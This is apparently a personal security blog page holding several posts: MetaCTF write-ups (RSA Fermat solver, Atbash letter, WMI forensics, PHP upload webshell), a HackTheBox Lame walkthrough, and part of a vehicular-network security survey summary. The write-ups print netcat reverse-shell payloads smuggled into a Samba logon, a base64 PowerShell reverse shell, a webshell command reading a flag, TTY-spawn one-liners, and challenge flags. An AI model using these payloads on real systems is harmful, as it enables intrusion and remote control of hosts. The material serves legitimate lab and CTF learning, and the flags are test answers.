<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, gcd</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">E = 65537</span><br><span class="line">OUTPUT_FILE = <span class="string">"output_data.txt"</span></span><br><span class="line"></span><br><span class="line">final_ct = 1250021393696525786335144361256414392593842741899479026585356065981817277181288068914492467448549175876062630331679179355487465372606959563984767504620720255739774332272265642671917705941701114225469036166567594052827968764499243560382703470425820431311019975034026645239723973080187014930125726065276819489811844274205868050933689117304876596915537920549094830768541674984384367985548037483091618223908344579452561631433297832894343244227860114298682044575901262345754528530201542566101805629757559712992093692264025791932530650085361520370720560897345946878375718294804530566609217693927191949845442274139788083823261127745109253437341146676011790218622001363252912102009978815070618838677527704373445935401007981220691357785265074004747715150454051491489944469565489921680045495525795924651018931270447789984693706499550173787891272109393797400115911729509755305600161994934603465525212582074265397044150982115224461467939</span><br><span class="line"></span><br><span class="line">def load_moduli(filename):</span><br><span class="line">    with open(filename, <span class="string">"r"</span>) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    n_values = re.findall(r<span class="string">"\d+"</span>, data)</span><br><span class="line">    moduli = [int(n) <span class="keyword">for</span> n <span class="keyword">in</span> n_values]</span><br><span class="line">    <span class="built_in">return</span> moduli</span><br><span class="line"></span><br><span class="line">def fermat_factorization(n):</span><br><span class="line">    a = isqrt(n) + 1</span><br><span class="line">    b2 = a * a - n</span><br><span class="line">    <span class="keyword">while</span> not isqrt(b2)**2 == b2:</span><br><span class="line">        a += 1</span><br><span class="line">        b2 = a * a - n</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line">    p = a + b</span><br><span class="line">    q = a - b</span><br><span class="line">    assert p * q == n, <span class="string">"Fermat factorization failed"</span></span><br><span class="line">    <span class="built_in">return</span> p, q</span><br><span class="line"></span><br><span class="line">def iterative_decrypt(final_ct, moduli, E):</span><br><span class="line">    ct = final_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(len(moduli))):</span><br><span class="line">        n = moduli[i]</span><br><span class="line">        p, q = fermat_factorization(n)</span><br><span class="line">        phi = (p - 1) * (q - 1)</span><br><span class="line">        d = inverse(E, phi)</span><br><span class="line">        ct = pow(ct, d, n) </span><br><span class="line">    <span class="built_in">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    moduli = load_moduli(OUTPUT_FILE)</span><br><span class="line">    recovered_pt = iterative_decrypt(final_ct, moduli, E)</span><br><span class="line">    flag = long_to_bytes(recovered_pt)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">"Recovered FLAG: {flag.decode()}"</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>MetaCTF{g0t_d0wn_7o_7h3_root_0f_th3_lo0py_pr1mes}</p>
</blockquote>
<hr>
<p>The Federal Bureau of Elfvestigation caught this suspicious letter in the mail, can you decode it to make sure nothing nefarious is going on? Here’s a photocopy of the letter.</p>
<p><img src="img/metactff.png" alt="metactff.png"></p>
<p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/atbash/">https://rumkin.com/tools/cipher/atbash/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Wvzi Hsrmmb Fkzgivv,</span><br><span class="line"></span><br><span class="line">Slkv blf<span class="string">'iv szermt z nviib wzb! R'</span>n <span class="built_in">rm</span> z yrg lu z hgrxpb hrgfzgrlm</span><br><span class="line">zmw xlfow ivzoob fhv blfi svok.</span><br><span class="line"></span><br><span class="line">Hl, Hftzikofn Nzib nzwv gsvhv znzarmt givzgh uli gsv luurxv</span><br><span class="line">kzigb, zmw, dvoo, R xlfowm<span class="string">'g ivhrhg. R vmwvw fk vzgrmt zoo lu gsvn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mld gsviv'</span>h mlgsrmt ovug uli gsv kzigb, zmw R<span class="string">'n rm z yrg lu z qzn</span></span><br><span class="line"><span class="string">(mlg fmorpv gsv uroovw wlmfgh szsz). R mvvw gl hlig gsrh lfg yvuliv</span></span><br><span class="line"><span class="string">Hftzikofn Nzib li Hzmgz urmw lfg, li gsv kzigb'</span>h tlrmt gl yv z </span><br><span class="line">wrhzhgvi.</span><br><span class="line"></span><br><span class="line">Wl blf szev zmb rwvzh li girxph fk blfi hovvev gl svok nv</span><br><span class="line">dsrk fk hlnv mvd givzgh <span class="built_in">rm</span> grnv? R pmld R xzm xlfmg lm blf gl </span><br><span class="line">pvvk gsrh yvgdvvm fh.</span><br><span class="line"></span><br><span class="line">R vmxibkgvw gsrh nvhhztv drgs zgyzhs, hl slkvufoob nb orggov</span><br><span class="line">hvxivg rh hzuv.</span><br><span class="line"></span><br><span class="line">Gszmph z glm uli yvrmt hfxs z tivzg uirvmw. R ldv blf lmv!</span><br><span class="line"></span><br><span class="line">Xsvvih,</span><br><span class="line">Yfhsb Vevitivvm</span><br><span class="line"></span><br><span class="line">K.H. Gszg xlwv blf dviv zhprmt zylfg gl fmolxp gsv wvevolknvmg nlwv </span><br><span class="line">uli gsv Nztrxzo Rmufhrlm Nzxsrmv, N2C24 rh </span><br><span class="line">NvgzXGU{ylgs_givzgh_zmw_nvhhztvh_hglovm}, slkv gszg svokh!</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dear Shinny Upatree,</span><br><span class="line"></span><br><span class="line">Hope you<span class="string">'re having a merry day! I'</span>m <span class="keyword">in</span> a bit of a sticky situation</span><br><span class="line">and could really use your <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">So, Sugarplum Mary made these amazing treats <span class="keyword">for</span> the office</span><br><span class="line">party, and, well, I couldn<span class="string">'t resist. I ended up eating all of them!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now there'</span>s nothing left <span class="keyword">for</span> the party, and I<span class="string">'m in a bit of a jam</span></span><br><span class="line"><span class="string">(not unlike the filled donuts haha). I need to sort this out before</span></span><br><span class="line"><span class="string">Sugarplum Mary or Santa find out, or the party'</span>s going to be a </span><br><span class="line">disaster.</span><br><span class="line"></span><br><span class="line">Do you have any ideas or tricks up your sleeve to <span class="built_in">help</span> me</span><br><span class="line">whip up some new treats <span class="keyword">in</span> <span class="keyword">time</span>? I know I can count on you to </span><br><span class="line">keep this between us.</span><br><span class="line"></span><br><span class="line">I encrypted this message with atbash, so hopefully my little</span><br><span class="line">secret is safe.</span><br><span class="line"></span><br><span class="line">Thanks a ton <span class="keyword">for</span> being such a great friend. I owe you one!</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line">Bushy Evergreen</span><br><span class="line"></span><br><span class="line">P.S. That code you were asking about to unlock the development mode </span><br><span class="line"><span class="keyword">for</span> the Magical Infusion Machine, M2X24 is </span><br><span class="line">MetaCTF{both_treats_and_messages_stolen}, hope that helps!</span><br></pre></td></tr></table></figure>
<hr>
<p>This Christmas, my festive joy turned into frustration. Decorations vanished, garlands moved, and cookies mysteriously disappeared. Blocking the chimney seemed like the solution, but the intrusions didn’t stop. That’s when it hit me: the thief must have created a “backchimney” — a secret passage we can’t find.</p>
<p>Can you uncover the mystery in the artifacts provided here and catch the culprit before they ruin Christmas?</p>
<p><a target="_blank" rel="noopener" href="https://github.com/davidpany/WMI_Forensics">https://github.com/davidpany/WMI_Forensics</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository]</span><br><span class="line">└─# <span class="built_in">cd</span> WMI_Forensics                </span><br><span class="line">                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 CCM_RUA_Finder.py -i ../OBJECTS.DATA -o out.xls</span><br><span class="line">                100% complete...                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/Repository/WMI_Forensics]</span><br><span class="line">└─# python2 PyWMIPersistenceFinder.py ../OBJECTS.DATA            </span><br><span class="line"></span><br><span class="line">    Enumerating FilterToConsumerBindings...</span><br><span class="line">    2 FilterToConsumerBinding(s) Found. Enumerating Filters and Consumers...</span><br><span class="line"></span><br><span class="line">    Bindings:</span><br><span class="line"></span><br><span class="line">        PowershellMemoryCapture-PowerShellProcessStarted</span><br><span class="line">            Consumer: </span><br><span class="line">                Consumer Type: CommandLineEventConsumer</span><br><span class="line">                Arguments:     powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIANAAwAC4AMQAiACwANAA5ADUAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAIgBNAGUAdABhAEMAVABGAHsAMQBfAGgANAB2ADMAXwBAAF8AYgA0AGMAawBjAGgAMQBtAG4AMwB5AF8ANABfAHkAMAB1AH0AIgAgACsAIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line">                Consumer Name: PowershellMemoryCapture</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  PowerShellProcessStarted</span><br><span class="line">                Filter Query: SELECT FileName, ProcessID FROM Win32_ModuleLoadTrace WHERE FileName LIKE <span class="string">"%System.Management.Automation%.dll"</span></span><br><span class="line"></span><br><span class="line">        SCM Event Log Consumer-SCM Event Log Filter</span><br><span class="line">                (Common binding based on consumer and filter names, possibly legitimate)</span><br><span class="line">            Consumer: NTEventLogEventConsumer ~ SCM Event Log Consumer ~ sid ~ Service Control Manager</span><br><span class="line"></span><br><span class="line">            Filter: </span><br><span class="line">                Filter name:  SCM Event Log Filter</span><br><span class="line">                Filter Query: <span class="keyword">select</span> * from MSFT_SCMEventLogEvent</span><br><span class="line"></span><br><span class="line">    Thanks <span class="keyword">for</span> using PyWMIPersistenceFinder! Please contact @DavidPany with questions, bugs, or suggestions.</span><br><span class="line"></span><br><span class="line">    Please review FireEye<span class="string">'s whitepaper for additional WMI persistence details:</span></span><br><span class="line"><span class="string">        https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf</span></span><br><span class="line"><span class="string">                                                                                                                                       </span></span><br></pre></td></tr></table></figure>
<p>把base64解ㄌ</p>
<p><img src="img/metactff1.png" alt="metactff.png"></p>
<p>flag在裡面</p>
<blockquote>
<p>MetaCTF{1_h4v3_@_b4ckch1mn3y_4_y0u}</p>
</blockquote>
<p>參考這個很有幫助 <a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/perseverance-biz-ctf-2022-forensics-writeup">https://www.hackthebox.com/blog/perseverance-biz-ctf-2022-forensics-writeup</a></p>
<hr>
<p>Santa wants to spread holiday cheer, but doesn’t want to rely on other websites for photo sharing. He’s building a new website to allow children to upload their holiday photos! Maybe check it out to make sure it’s secure…</p>
<p>Download the source code for the website here.</p>
<p>Your URL is <a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/">http://l5fqfkfbfkm8.chals.mctf.io</a></p>
<p><img src="img/metactff2.png" alt="metactff.png"></p>
<p>檢查拿到的程式</p>
<p>在 <code>upload.php</code> 的代碼中，上傳的文件沒有進行嚴格的檢查和限制：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">"metactff"</span>][<span class="string">"tmp_name"</span>], <span class="variable">$target_file</span>)) {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div class='alert alert-success mt-3'&gt;Your photo has been uploaded!&lt;/div&gt;"</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div class='alert alert-danger mt-3'&gt;There was an error uploading your file.&lt;/div&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>缺乏文件類型檢查</strong>：<code>$_FILES["metactff"]["name"]</code> 直接用於生成目標文件名，並未檢查文件是否真的是圖片（如 JPEG、PNG）。</li>
<li><strong>缺乏 MIME 類型檢查</strong>：沒有驗證 <code>$_FILES["metactff"]["type"]</code> 是否與圖片類型匹配。</li>
<li><strong>缺乏內容檢查</strong>：沒有檢查文件的內容是否為合法圖片格式，而非惡意代碼。</li>
</ul>
<p>上傳的文件被存儲在 <code>metactffs/</code> 目錄中，該目錄允許執行 PHP 文件。</p>
<ul>
<li>Web 服務器的配置允許執行 <code>metactffs/</code> 目錄中的 PHP 文件，因此上傳的惡意文件（如 <code>exp.php</code>）可以被執行。</li>
</ul>
<p>透過原始碼知道他所有文件上傳到metactffs</p>
<p>不知道flag位置沒問題，直接查找，因為上傳的exploit讓我們可以發動任意指令</p>
<p><img src="img/metactff3.png" alt="metactff.png"></p>
<p><a target="_blank" rel="noopener" href="http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat/var/www/html/flag.txt">http://l5fqfkfbfkm8.chals.mctf.io/metactffs/exp.php?cmd=cat /var/www/html/flag.txt</a></p>
<p><img src="img/metactff4.png" alt="metactff.png"></p>
<blockquote>
<p>GIF89aMetaCTF{ph3ar_d3s3rial1z3d_0bj3cts} MetaCTF{ph3ar_d3s3rial1z3d_0bj3cts}</p>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="Lame-Lame" class="article article-type-Lame" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Lame/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.086Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Lame/">
        HTB_Lame
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/rkVBbdxa6">Nmap &amp; smbclient</a></p>
<p>first we need to know what the Machines open service</p>
<ul>
<li>IP 10.129.108.1</li>
<li><p>OS Parrot</p>
</li>
<li><p>nmap -sV -Pn -A -sC 10.129.108.1</p>
</li>
<li>nmap -p 1-65535 -T4 -A -v 10.129.108.1</li>
</ul>
<p><img src="img/lame_Untitled.png" alt="Untitled"></p>
<p><img src="img/lame_Untitled_1.png" alt="Untitled"></p>
<p><img src="img/lame_Untitled_2.png" alt="Untitled"></p>
<p><img src="img/lame_Untitled_3.png" alt="Untitled"></p>
<p><img src="img/lame_Untitled_4.png" alt="Untitled"></p>
<p>Now we can see the open port is:</p>
<ul>
<li>21/tcp vsftpd 2.3.4 ftp service</li>
<li>22/tcp Openssh 4.7p1 Debian 8ubuntu1 (protocol 2.0) SSH</li>
<li>445/tcp Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)  netbios-ssn</li>
</ul>
<p>One of the FTP services allows guests to login</p>
<p><img src="img/lame_Untitled_5.png" alt="Untitled"></p>
<p>So I try using anonymous login FTP service，but the content is empty</p>
<p><img src="img/lame_Untitled_6.png" alt="Untitled"></p>
<p>Then I decided to look for vulnerabilities in this service version</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49757">Offensive Security’s Exploit Database Archive</a></p>
<p>The exploit-db  platform has seen this version of the vulnerability message </p>
<p>And the vulnerability is <code>CVE-2011-2523</code></p>
<p>But I find some problem, this CVE cannot be used here, becouse I use the more exploit to try this CVE, So I guess “this topic” should not apply to this vulnerability</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE">https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/nobodyatall648/CVE-2011-2523">https://github.com/nobodyatall648/CVE-2011-2523</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/0xSojalSec/-CVE-2011-2523">https://github.com/0xSojalSec/-CVE-2011-2523</a></li>
</ul>
<p>Back to what I said earlier, in addition to FTP services, there are also SSH and SMB services</p>
<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-430455/Openbsd-Openssh-4.7p1.html">Openbsd Openssh version 4.7p1 : Security vulnerabilities</a></p>
<p>After searching for vulnerabilities in this version of SSH, I found no exploitable vulnerabilities, so I directly tested the SMB service</p>
<p>The SMB service has two ports opened</p>
<p><img src="img/lame_Untitled_7.png" alt="Untitled"></p>
<p>When I browsed the exploit-db platform again, I found a lot of exploitable vulnerability information after looking for the Samba service. Among them, the 445 port targeted the vulnerability of smbd 3.0.20, and I also saw this vulnerability exploit information in the platform list.</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/16320">Offensive Security’s Exploit Database Archive</a></p>
<p><img src="img/lame_Untitled_8.png" alt="Untitled"></p>
<p><img src="img/lame_Untitled_9.png" alt="Untitled"></p>
<p>You can see that the CVE number is 2007-2447</p>
<p><a target="_blank" rel="noopener" href="https://www.samba.org/samba/security/CVE-2007-2447.html">Samba - Security Announcement Archive</a></p>
<p>The exploit needs to import the suite first from smb.SMBConnection import SMBConnection</p>
<p>So you have to download the smb for python3 first. If you use the pysmb tool, it will always report an error (for online HTB machines)</p>
<ul>
<li>sudo apt install python3-smb</li>
</ul>
<p>Because the During the OSCP exam  we can’t use MSF tool to help us complete the topic</p>
<p>Use the exploit is the good choose, but this doesn’t work for me</p>
<p><a target="_blank" rel="noopener" href="https://github.com/amriunix/CVE-2007-2447">https://github.com/amriunix/CVE-2007-2447</a></p>
<p>So I decided not to test this way</p>
<p>(Here I changed the IP)</p>
<p>first I want to know the smb service if I use Anonymous identity to login the SMB it can be access?</p>
<p><img src="img/lame_Untitled_10.png" alt="Untitled"></p>
<p>as i guessed</p>
<p>The smb exploit</p>
<ul>
<li>logon “/=<code>nc ‘tun0 interface IP’ 4444 -e /bin/bash</code>”</li>
</ul>
<p><img src="img/lame_Untitled_11.png" alt="Untitled"></p>
<p><img src="img/lame_Untitled_12.png" alt="Untitled"></p>
<p>I think this method is Failed</p>
<p>So want to try other payload</p>
<p><a target="_blank" rel="noopener" href="https://oscp.infosecsanyam.in/untitled/smb-enumeration">SMB Enumeration</a></p>
<ul>
<li><p>logon “./=<code>nohup nc -e /bin/sh LHOST LPORT</code>“</p>
<p>  <img src="img/lame_Untitled_13.png" alt="Untitled"></p>
</li>
</ul>
<p>when I use this payload, the nc well return the <strong>connect to [10.10.14.9] from (UNKNOWN) [10.129.109.152] 39109</strong> message to me</p>
<p><img src="img/lame_Untitled_14.png" alt="Untitled"></p>
<p>So I decide to try some command under nc</p>
<p><img src="img/lame_Untitled_15.png" alt="Untitled"></p>
<p>In order to be fully interactive in this simple reverse shell environment, I use the interactive terminal generated by Python</p>
<ul>
<li><p>TTY</p>
<p>  There a command exists called <strong>tty</strong> which displays information related to <strong>terminal</strong>. The <strong>tty</strong>  command of terminal basically prints the file name of the terminal connected to standard input. <strong>tty</strong> is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system.</p>
<p>  <a target="_blank" rel="noopener" href="https://ppfocus.com/0/teae6b945.html">Spawning A TTY Shell-逃逸 Linux 各種 Shell 來執行命令 - 人人焦點</a></p>
</li>
</ul>
<p>Attackers may upgrade a simple reverse shell to a fully interactive <code>tty</code> after obtaining initial access to a host.</p>
<p><strong>Spawning a TTY Shell</strong></p>
<ul>
<li>python -c ‘import pty; pty.spawn(“/bin/sh”)’</li>
<li>echo os.system(‘/bin/bash’)</li>
<li>/bin/sh -i</li>
<li>perl —e ‘exec “/bin/sh”;’</li>
<li>perl: exec “/bin/sh”;</li>
<li>ruby: exec “/bin/sh”</li>
<li>lua: os.execute(‘/bin/sh’)</li>
<li>exec “/bin/sh”</li>
</ul>
<p><img src="img/lame_Untitled_16.png" alt="Untitled"></p>
<h3 id="Rule-query"><a href="#Rule-query" class="headerlink" title="Rule query"></a>Rule query</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event.action:executed and process.name:python and</span><br><span class="line">process.args:(&quot;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&quot; or &quot;import pty;</span><br><span class="line">pty.spawn(\&quot;/bin/dash\&quot;)&quot; or &quot;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&quot;)</span><br></pre></td></tr></table></figure>
<p>when I execution python -c ‘import pty; pty.spawn(“/bin/sh”)’ </p>
<p>I well got the fully interactive, it let me easy to operate</p>
<p><img src="img/lame_Untitled_17.png" alt="Untitled"></p>
<ul>
<li>cat /root/root.txt ⇒ ffed091dd44f75f11cb90d85bb1ca752</li>
</ul>
<p><img src="img/lame_Untitled_18.png" alt="Untitled"></p>
<p>To be honest, I searched for flag’s file for a long time, because it doesn’t have a fixed file name and location.</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Machine_Learning_for_Security in_Vehicular_Net_wor" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Machine_Learning_for_Security%20in_Vehicular_Net_wor/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.086Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Machine_Learning_for_Security%20in_Vehicular_Net_wor/">
        Machine Learning for Security in Vehicular Networks A Comprehensive Survey
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Machine-Learning-for-Security-in-Vehicular-Net-works-A-Comprehensive-Survey"><a href="#Machine-Learning-for-Security-in-Vehicular-Net-works-A-Comprehensive-Survey" class="headerlink" title="Machine_Learning_for_Security in_Vehicular_Net_works_A_Comprehensive_Survey"></a>Machine_Learning_for_Security in_Vehicular_Net_works_A_Comprehensive_Survey</h1><p>車聯網資安調查 upstream security <a target="_blank" rel="noopener" href="https://upstream.auto/">https://upstream.auto/</a></p>
<p>標題：車輛網絡安全機器學習技術綜合調查</p>
<p><img src="img/vehicle_Untitled.png" alt="Structure of this Survey"></p>
<p>Structure of this Survey</p>
<p>介紹：</p>
<ul>
<li>車載網絡容易受到各種安全攻擊</li>
</ul>
<blockquote>
<p>由於多種原因，車載網絡容易受到各種安全攻擊。 首先，車載網絡是高度動態和異構的，具有大量的設備和通信協議。 這種複雜性使得確保網絡安全和檢測潛在威脅變得困難。 其次，車載網絡經常傳輸位置、駕駛員身份和車輛狀態等敏感信息，攻擊者可以利用這些信息發動攻擊或危及乘客的安全。 最後，車載網絡本質上是資源受限和移動的，這使得實施不影響網絡性能或可用性的有效安全解決方案具有挑戰性。</p>
<p>本文確定了幾個可能影響車輛網絡安全的關鍵攻擊問題。 這些包括：</p>
<blockquote>
<p>對抗性攻擊Adversarial attacks：對抗性攻擊可以操縱車輛安全解決方案中使用的 ML 算法的輸入數據，從而導致不正確的預測或決策。</p>
<p>中毒攻擊Poisoning attacks：中毒攻擊可以操縱用於訓練車輛安全解決方案中 ML 算法的訓練數據，從而導致做出錯誤預測或決策的有偏見的模型。</p>
<p>干擾攻擊Jamming attacks：干擾攻擊可以通過在通信信道上傳輸噪聲來破壞車輛之間或車輛與基礎設施之間的通信。</p>
<p>竊聽攻擊Eavesdropping attacks：竊聽攻擊可以攔截車輛之間或車輛與基礎設施之間的通信，以獲取位置或駕駛員身份等敏感信息。</p>
<p>Sybil 攻擊Sybil attacks：Sybil 攻擊涉及在車載網絡中創建多個假身份以發起其他類型的攻擊，例如乾擾或竊聽。</p>
<p>拒絕服務 (DoS) 攻擊Denial-of-service (DoS) attacks：DoS 攻擊涉及用流量或請求淹沒系統以破壞其正常運行。</p>
<p>中間人 (MitM) 攻擊Man-in-the-middle (MitM) attacks：MitM 攻擊涉及攔截兩方之間的通信並將其更改為惡意目的。</p>
</blockquote>
</blockquote>
<p><img src="img/vehicle_Untitled_1.png" alt="Taxonomy of attacks in vehicular network"></p>
<p>Taxonomy of attacks in vehicular network</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Attack</th>
<th>Countermeasures</th>
<th>Violated security services</th>
</tr>
</thead>
<tbody>
<tr>
<td>denial of service attacks</td>
<td>• use pre-authentication scheme</td>
</tr>
</tbody>
</table>
</div>
<p>• use an attacked packet detection algorithm  | • availability |<br>| Jamming attack | • use threshold-based jamming countermeasure technique<br>• use the frequency hopping technique | • availability |<br>| Malware attack | • installing anti-malware applications<br>• installing basic internet security applications  | • availability |<br>| broadcast tampering attack | • use digital signatures | • availability |<br>| Spamming attack | • embedded anti-malware frameworks | • availability |<br>| greedy behaviour attack | • use watchdogs<br>• use instrusion detection systems | • availability |<br>| Blackhole attack | • use detection, prevention and reactive AODV protocol<br>• use BAMBi technique  | • availability |<br>| Eavesdropping attack | • use encryption techniques | • confidentiality |<br>| traffic analysis | • use encryption techniques<br>• use VIPER technique for V2I communications  | • confidentiality |<br>| man in the middle attack | • use strong authentication methods<br>• use Hash functions | • confidentiality |<br>| social attack | • use digital signatures | • confidentiality |<br>| Sybil attack | • use a timestamp series approach<br>• use a distributed and robust approach  | • authentication |<br>| Masqurading | • do not save passwords on computers<br>• change passwords on a regular basis<br>• use long and hard to guess passwords  | • authentication and data integrity |<br>| replay attack | • use a globally synchronised time for all nodes<br>• use time stamps or nonce | • authentication and data integrity |<br>| impersonation attack | • use secure and privacy enhancing communications schemes<br>• use digital certificates | • authentication |<br>| GPS spoofing attack and tunnelling attack | • analyse of signal strength distribution between transmitted and received signals | • authentication |<br>| message tampering | • use hashing techniques<br>• use digital signatures<br>• use strong authorisation | • authentication |<br>| key and/or certificate replication | • use strong authentication<br>• aavoid sharing of keys | • authentication |<br>| free-riding attack with fake authentication efforts | • use strong authentication | • authentication |<br>| message modification attack | • use digital signatures | • data integrity |<br>| illusion attack | • use trusted hardware | • data integrity |<br>| repudiation attack | • use digital signatures<br>• use PKC-based pseudo-IDs  | • non-repudiation |</p>
<h3 id="Security-Attacks-and-Requirements"><a href="#Security-Attacks-and-Requirements" class="headerlink" title="Security Attacks and Requirements"></a>Security Attacks and Requirements</h3><ul>
<li>Hardware or software (HW/SW)-based attacks: 這些攻擊針對車輛網絡的硬體或軟體組件，例如電子控制單元 (ECU) 或固件。 基於硬體/軟體的攻擊示例包括拒絕服務 (DoS) 攻擊、惡意軟體注入或緩衝區溢出。<ul>
<li>Bogus Information：在這種類型的攻擊中，攻擊者發送一段偽造或錯誤的信息來誤導車輛中硬體或軟體系統的功能。</li>
<li>Timming Attack：是一種邊信道攻擊，通過分析密碼算法的執行時間來破壞系統的安全性。</li>
<li>Message Forgery：發起此類攻擊是為了欺騙收件人關於真實發件人的信息。</li>
<li>Replay Attack：這種攻擊也稱為回放攻擊，其中有效或真實數據的傳輸被惡意重複或延遲以誤導系統的功能。</li>
<li>Masquerading Attack:：這是一種攻擊形式，其中攻擊者使用虛假身份獲得對車輛系統的未授權訪問。</li>
